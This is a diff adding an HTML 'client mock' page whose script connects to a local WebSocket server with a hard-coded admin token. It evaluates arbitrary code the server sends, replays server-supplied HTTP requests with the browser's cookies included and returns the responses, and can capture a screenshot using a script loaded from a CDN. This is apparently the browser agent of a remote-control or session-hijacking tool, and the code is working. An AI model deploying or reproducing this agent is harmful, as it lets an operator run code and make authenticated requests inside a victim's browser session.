@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Client mock</title>
+    <script>
+        class CommunicationChannel {
+            constructor(id, admin='') {
+                const url = `ws://localhost:3000/ws/${id}` + (admin ? `?admin=${admin}` : '');
+                const ws = this.ws = new WebSocket(url);
+                ws.onmessage = this.onMessage.bind(this);
+
+            }
+
+            sendBack(data) {
+                this.send({
+                    type: 'eval-result',
+                    data: data
+                });
+            }
+
+            arraybufferToHex(arr) {
+                const a = new Uint8Array(arr);
+
+                return Array.prototype.map.call(a, byte => ('00'+byte.toString(16)).slice(-2)).join('');
+            }
+
+            hexToArraybuffer(hex) {
+                return new Uint8Array(hex.match(/[0-9a-f]{2}/gi).map(c => parseInt(c, 16)));
+            }
+
+            async onMessage(ev) {
+                const data = JSON.parse(ev.data);
+                const { type } = data;
+
+                if (type === 'eval') {
+                    const code = '((' + data.code + '))';
+                    const f = eval(code);
+                    f.call(null, this.sendBack.bind(this));
+                } else if (type === 'request') {
+                    const { url, headers, method, body, id } = data;
+                    const res = await this.performHttpRequest(url, headers, method, body);
+
+                    const respHeaders = [...res.headers];
+                    const { status, statusText } = res;
+                    const respBody = this.arraybufferToHex(await res.arrayBuffer())
+
+                    const respInfo = {
+                        status,
+                        statusText,
+                        body: respBody,
+                        headers: respHeaders,
+                    }
+
+                    this.send({
+                        type: 'response',
+                        id: id,
+                        data: respInfo,
+                    });
+                }
+            }
+
+            async performHttpRequest(url, headers, method, body) {
+                const fetchHeaders = new Headers();
+
+                for (let [name, val] of headers) {
+                    fetchHeaders.set(name, val);
+                }
+
+                method = method.toUpperCase();
+
+                return fetch(url, {
+                    headers: fetchHeaders,
+                    credentials: 'include',
+                    method,
+                    body: ((method !== 'GET' && method !== 'HEAD') ? this.hexToArraybuffer(body): null),
+                });
+            }
+
+            send(msg) {
+                this.ws.send(JSON.stringify(msg));
+            }
+
+            sendPing() {
+                this.send({type: 'ping'});
+            }
+
+            sendEval(code) {
+                this.send({
+                    type: 'eval',
+                    code,
+                })
+            }
+        }
+
+        async function setup() {
+            const id = await createSession();
+
+            window.cca = new CommunicationChannel(id, '9313718f82401a434a5c58492091f924');
+            window.ccc = new CommunicationChannel(id);
+
+        }
+
+        async function createSession() {
+            const f = await fetch('http://localhost:3000/create-session');
+            const res = await f.json();
+
+            window.id = res;
+            return res.id;
+        }
+
+
+        window.takeScreenshot = function takeScreenshot(send) {
+            var s = document.createElement('script');
+            s.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
+            s.onload = async () => {
+                const canvas = await html2canvas(document.body);
+                console.log(canvas.toDataURL('image/jpeg', 0.2));
+            };
+            document.body.appendChild(s);
+        }
+
+        setup();
+
+    </script>
+</head>
+<body>
+
+</body>
+</html>
